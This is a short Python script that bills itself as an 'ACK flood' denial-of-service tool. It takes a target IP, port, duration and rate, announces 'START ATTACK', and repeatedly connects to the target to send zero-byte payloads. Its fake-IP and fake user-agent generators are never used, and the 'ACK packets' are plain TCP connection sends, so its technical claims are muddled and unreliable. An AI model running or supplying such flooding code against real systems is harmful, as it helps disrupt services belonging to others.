import socket
import sys
import time
import random
from fake_useragent import UserAgent

def generate_fake_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def generate_fake_user_agent():
    ua = UserAgent()
    return ua.random

def ack_flood(target_ip, target_port, duration, packets_per_second):
    try:
        end_time = time.time() + duration

        while time.time() < end_time:
            fake_ip = generate_fake_ip()
            fake_user_agent = generate_fake_user_agent()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))

            ack_packet = (
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            )

            sock.send(ack_packet)
            sock.close()

            time.sleep(1 / packets_per_second)

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: ack.py <target_ip> <target_port> <duration> <packets_per_second>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    packets_per_second = float(sys.argv[4])
    print(f"START ATTACK ACK TO {target_ip}")

    ack_flood(target_ip, target_port, duration, packets_per_second)
